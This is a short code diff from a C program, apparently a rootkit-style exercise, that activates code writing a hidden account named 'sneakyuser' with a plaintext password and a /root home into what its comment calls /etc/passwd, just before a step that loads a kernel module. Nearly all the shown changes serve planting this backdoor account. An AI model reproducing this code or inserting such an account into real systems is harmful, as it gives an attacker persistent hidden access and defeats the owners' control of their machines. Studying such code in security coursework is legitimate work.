@@ -31,12 +31,12 @@ int main()
   {
     fputc(content, writeFile);
   }
+  fclose(writeFile);
   // Add sneaky user into /etc/passwd
-  //char* sneakyuser = "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash";
-  //fputs(sneakyuser, readFile);
+  char *sneakyuser = "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash";
+  fprintf(readFile, "%s", sneakyuser);
   // Close open files
   fclose(readFile);
-  fclose(writeFile);
 
   // Step 3
   printf("start load module\n");
